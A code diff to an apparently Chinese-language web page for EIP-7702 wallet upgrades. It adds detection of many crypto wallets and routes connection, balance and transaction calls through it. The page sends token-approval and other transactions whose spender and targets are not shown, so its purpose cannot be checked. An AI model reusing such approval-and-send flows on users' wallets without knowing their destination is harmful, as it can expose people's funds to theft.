@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EIP-7702 智能钱包升级 & 执行</title>
+    <title>EIP-7702 智能钱包升级 & 执2行</title>
     <style>
         * {
             margin: 0;
@@ -370,6 +370,46 @@
         let userAddress = null;
         let currentChainId = null;
 
+        // ============== 获取钱包 Provider ==============
+        function getProvider() {
+            // imToken 钱包
+            if (window.imToken) {
+                console.log('检测到 imToken 钱包');
+                return window.ethereum || window.imToken;
+            }
+            // TokenPocket 钱包
+            if (window.tokenpocket || window.isTokenPocket) {
+                console.log('检测到 TokenPocket 钱包');
+                return window.ethereum;
+            }
+            // OKX 钱包
+            if (window.okxwallet) {
+                console.log('检测到 OKX 钱包');
+                return window.okxwallet;
+            }
+            // Trust Wallet
+            if (window.trustwallet) {
+                console.log('检测到 Trust Wallet');
+                return window.trustwallet;
+            }
+            // Coinbase Wallet
+            if (window.coinbaseWalletExtension) {
+                console.log('检测到 Coinbase Wallet');
+                return window.coinbaseWalletExtension;
+            }
+            // BitKeep / Bitget
+            if (window.bitkeep) {
+                console.log('检测到 BitKeep 钱包');
+                return window.bitkeep.ethereum;
+            }
+            // 通用 ethereum provider
+            if (window.ethereum) {
+                console.log('检测到 ethereum provider');
+                return window.ethereum;
+            }
+            return null;
+        }
+
         // ============== 连接钱包 ==============
         async function connectWallet() {
             const btn = document.getElementById('connectBtn');
@@ -380,17 +420,26 @@
                 btn.disabled = true;
                 btn.innerHTML = '<span class="loading"></span> 连接中...';
 
-                // 检查是否安装了钱包
-                if (!window.ethereum) {
-                    throw new Error('未检测到钱包，请安装 MetaMask 或其他 EVM 钱包');
+                // 获取钱包 provider
+                provider = getProvider();
+
+                if (!provider) {
+                    throw new Error('未检测到钱包，请使用 imToken / TokenPocket / OKX / MetaMask 等钱包打开此页面');
                 }
 
                 // 请求连接
-                const accounts = await window.ethereum.request({
-                    method: 'eth_requestAccounts'
-                });
+                let accounts;
+                try {
+                    // 标准方式
+                    accounts = await provider.request({
+                        method: 'eth_requestAccounts'
+                    });
+                } catch (e) {
+                    // 备用方式（兼容旧版钱包）
+                    accounts = await provider.enable();
+                }
 
-                if (accounts.length === 0) {
+                if (!accounts || accounts.length === 0) {
                     throw new Error('未授权任何账户');
                 }
 
@@ -398,7 +447,7 @@
 
                 // 切换网络
                 try {
-                    await window.ethereum.request({
+                    await provider.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x' + parseInt(targetChainId).toString(16) }]
                     });
@@ -408,14 +457,25 @@
                 }
 
                 // 获取当前链 ID
-                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+                let chainIdHex;
+                try {
+                    chainIdHex = await provider.request({ method: 'eth_chainId' });
+                } catch (e) {
+                    // 备用方式
+                    chainIdHex = provider.chainId;
+                }
                 currentChainId = parseInt(chainIdHex, 16);
 
                 // 获取余额
-                const balance = await window.ethereum.request({
-                    method: 'eth_getBalance',
-                    params: [userAddress, 'latest']
-                });
+                let balance;
+                try {
+                    balance = await provider.request({
+                        method: 'eth_getBalance',
+                        params: [userAddress, 'latest']
+                    });
+                } catch (e) {
+                    balance = '0x0';
+                }
                 const balanceEth = parseInt(balance, 16) / 1e18;
 
                 // 更新 UI
@@ -474,7 +534,7 @@
 
                 // 尝试发送
                 try {
-                    const txHash = await window.ethereum.request({
+                    const txHash = await provider.request({
                         method: 'eth_sendTransaction',
                         params: [txParams]
                     });
@@ -548,7 +608,7 @@
                 const calldata = buildApproveCalldata(tokenAddress, spender);
 
                 // 发送交易
-                const txHash = await window.ethereum.request({
+                const txHash = await provider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: userAddress,
@@ -617,21 +677,27 @@
         });
 
         // 监听账户变化
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', function(accounts) {
-                if (accounts.length === 0) {
-                    location.reload();
-                } else {
-                    userAddress = accounts[0];
-                    document.getElementById('walletAddress').textContent =
-                        userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
-                }
-            });
+        function setupWalletListeners() {
+            const p = getProvider();
+            if (p && p.on) {
+                p.on('accountsChanged', function(accounts) {
+                    if (accounts.length === 0) {
+                        location.reload();
+                    } else {
+                        userAddress = accounts[0];
+                        document.getElementById('walletAddress').textContent =
+                            userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
+                    }
+                });
 
-            window.ethereum.on('chainChanged', function() {
-                location.reload();
-            });
+                p.on('chainChanged', function() {
+                    location.reload();
+                });
+            }
         }
+
+        // 页面加载时设置监听
+        setupWalletListeners();
     </script>
 </body>
 </html>
